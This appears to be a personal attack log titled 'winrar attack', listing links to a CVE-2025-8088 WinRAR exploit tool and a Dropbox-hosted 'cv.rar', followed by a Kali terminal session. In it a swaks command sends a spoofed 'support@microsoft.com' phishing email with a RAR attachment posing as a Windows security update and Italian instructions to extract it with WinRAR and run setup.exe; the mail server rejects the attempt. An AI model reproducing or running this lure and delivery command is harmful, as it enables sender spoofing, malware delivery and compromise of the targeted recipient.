winrar attack
https://github.com/Syrins/CVE-2025-8088-Winrar-Tool-Gui

https://nvd.nist.gov/vuln/detail/CVE-2025-8088

https://www.youtube.com/watch?v=m_0Axsh_oO4



https://www.dropbox.com/scl/fi/usanogb6nuokrt87sd2ex/cv.rar?rlkey=shsd54np60fpzyoz9730zrouo&st=20i9whng&dl=0

┌──(kali㉿kali)-[~]
└─$ swaks --to "secretary.uni.local@gmail.com" --from "support@microsoft.com" --server "smtp.mail.yahoo.com:587" -tls --attach ~/Downloads/test1.rar --header "Subject: 🛡<fe0f> Windows Security Update KB2267602 - Installa Ora" --body "Aggiornamento critico sicurezza.\n\n1. Salva allegato\n2. Estrai con WinRAR\n3. Esegui setup.exe\n\nMicrosoft Security Team" --header "X-Mailer: Microsoft Outlook 16.0.14326.20499" --header "Content-Disposition: attachment; filename="Windows_Security_Update_Jan2026.rar""
=== Trying smtp.mail.yahoo.com:587...
=== Connected to smtp.mail.yahoo.com.
<-  220 smtp.mail.yahoo.com ESMTP ready
 -> EHLO kali
<-  250-hermes--production-ir2-6fcf857f6f-vw7gs Hello kali [193.205.162.163])
<-  250-PIPELINING
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-SIZE 41697280
<-  250 STARTTLS
 -> STARTTLS
<-  220 2.0.0 Ready to start TLS
=== TLS started with cipher TLSv1.3:TLS_AES_128_GCM_SHA256:128
=== TLS client certificate not requested and not sent
=== TLS no client certificate set
=== TLS peer[0]   subject=[/C=US/ST=New York/L=New York/O=Yahoo Holdings Inc./CN=smtp.mail.yahoo.com]
===               commonName=[smtp.mail.yahoo.com], subjectAltName=[DNS:smtp.mail.yahoo.com, DNS:smtp.mail.yahoo.com.ar, DNS:smtp.mail.yahoo.com.au, DNS:smtp.mail.yahoo.com.br, DNS:smtp.mail.yahoo.com.cn, DNS:smtp.mail.yahoo.com.hk, DNS:smtp.mail.yahoo.com.my, DNS:smtp.mail.yahoo.com.ph, DNS:smtp.mail.yahoo.com.sg, DNS:smtp.mail.yahoo.com.tw, DNS:smtp.mail.yahoo.com.vn, DNS:smtp.mail.yahoo.co.id, DNS:smtp.mail.yahoo.co.in, DNS:smtp.mail.yahoo.co.kr, DNS:smtp.mail.yahoo.co.th, DNS:smtp.mail.yahoo.co.uk, DNS:smtp.mail.yahoo.ca, DNS:smtp.mail.yahoo.cn, DNS:smtp.mail.yahoo.de, DNS:smtp.mail.yahoo.fr, DNS:smtp.mail.yahoo.it, DNS:smtp.y7mail.com, DNS:smtp.correo.yahoo.es] notAfter=[2026-04-08T23:59:59Z]
=== TLS peer[1]   subject=[/C=US/O=DigiCert Inc/OU=www.digicert.com/CN=DigiCert SHA2 High Assurance Server CA]
===               commonName=[DigiCert SHA2 High Assurance Server CA], subjectAltName=[] notAfter=[2028-10-22T12:00:00Z]
=== TLS peer certificate passed CA verification, passed host verification (using host smtp.mail.yahoo.com to verify)
 ~> EHLO kali
<~  250-hermes--production-ir2-6fcf857f6f-vw7gs Hello kali [193.205.162.163])
<~  250-PIPELINING
<~  250-ENHANCEDSTATUSCODES
<~  250-8BITMIME
<~  250-SIZE 41697280
<~  250 AUTH PLAIN LOGIN XOAUTH2 OAUTHBEARER
 ~> MAIL FROM:<support@microsoft.com>
<~* 554 Email rejected
 ~> QUIT
<~  221 Service Closing transmission
=== Connection closed with remote host.

